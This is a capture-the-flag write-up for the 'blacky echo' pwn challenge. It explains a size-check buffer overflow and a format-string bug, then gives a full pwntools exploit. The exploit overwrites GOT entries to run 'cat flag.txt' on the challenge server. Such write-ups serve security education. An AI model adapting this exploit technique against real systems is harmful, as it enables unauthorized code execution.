---
ctf_name: "m0lecon 2020 Teaser"
title:	"blacky echo"
date:	2020-05-24
category: "pwn"
author: "OrsoBruno96"
---

### Program description
Mainly two bugs:
- Bad checking over size input in function go leads to buffer overflow

```c
  int __n = get_int();
  if ( ((ushort)__n == 0) || ((ushort)__n > 0x3f) ) {
    memcpy(auStack56,"Length err",10);
    print_error(auStack56);
  }
  // it only checks the lower two bytes of __n but uses 4 bytes in the end
  fgets(acStack65592,__n,stdin);
```

- Using memcpy to write "Format err" on the buffer does not
add a terminating "\x00", so we can use the original string
to put some %s and %n to read and write.

```c
// in function go()
  if ( strncmp(acStack65592,"ECHO->", 6) ) {
    memcpy(auStack56,"Format err",10);
    print_error(auStack56);
  }
// in function print_error(param_1)
  snprintf(local_98,0x32,"[!] Error: %s",param_1); // copies also the overflowed user controllable content
  fprintf(stderr,local_98);
```

### Exploit

- In the first input we leak the `exe.sym.got['system']` address
and then we override the `exit@got entry` with the address of `main`
to have further input at our disposal.

- Then we overwrite `puts@got entry` with the system address we wrote
earlier.

- In the end we properly use the echo program to echo "cat flag.txt".

```python
from pwn import ELF, context, args, gdb, remote, process, log, \
    p64, u64, cyclic, ui 

exe = context.binary = ELF("blacky_echo")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
remotehost = ("challs.m0lecon.it", 9011)
gdbscript = """
# break *go + 0x135
# break *go + 0x109
# break *go + 0x11e
break *print_error + 0x7d
# gef config context.nb_lines_stack 8250
gef config context.nb_lines_stack 40
continue
"""

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(exe=exe.path, args=[exe.path] + argv,
                         gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    elif args.GDBSCRIPT:
        print(gdbscript)
        exit(0)
    else:
        return process([exe.path] + argv, *a, **kw)

def leak_system_address():
    io.recvuntil("Size:")
    size = 2**17 + 10
    io.sendline(f"{size}")
    io.recvuntil("Input:")
    log.info(f"{exe.sym.got['system']:#08x}")
    # 21
    io.sendline(
        p64(exe.sym.got['system']) +
        p64(exe.sym.got['exit']) +
        cyclic(0x10000 + 10 - 16) +
        b"a"*6 + b"%31$s" + f"%{0xb54 - 33}c".encode() + b"%32$hn")
    io.recvuntil(b"Format erraaaaaa")
    ans = io.recvline().strip()
    cusu = ans.ljust(8, b"\x00")[:8]
    libc_addr = u64(cusu) & 0x0000ffffffffffff
    log.info(f"address: {libc_addr:#08x}")
    libc.address = libc_addr - libc.sym.system
    log.info(f"libc: {libc.address:#08x}")
    log.debug(f"Go check GOT: {exe.sym.got['exit']}")
    return libc_addr

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def write_byte(addr, val):
    io.recvuntil("Size:")
    size = 2**17 + 10
    io.sendline(f"{size}")
    io.recvuntil("Input:")
    ui.pause()
    io.sendline(
        p64(addr) +
        cyclic(0x10000 + 10 - 16 + 8) +
        f"%{(0xff - 0x15 + 1)&0xff}c".encode() +
        f"%{(val)}c".encode() +
        b"%31$hhn"
    )
    log.info(io.recvline())

def altro_edit_puts_addr(system_addr):
    for i, chunk in enumerate(chunks(f"{system_addr:012x}", 4)):
        write_byte(exe.sym.got['puts'], int(chunk, 16))
    io.recvuntil("Size:")
    size = 2**17 + 10
    io.sendline(f"{size}")
    io.recvuntil("Input:")
    io.sendline("ECHO->cat flag.txt")

if __name__ == "__main__":
    io = start()
    system_addr = leak_system_address()
    altro_edit_puts_addr(system_addr)
    io.interactive()
```
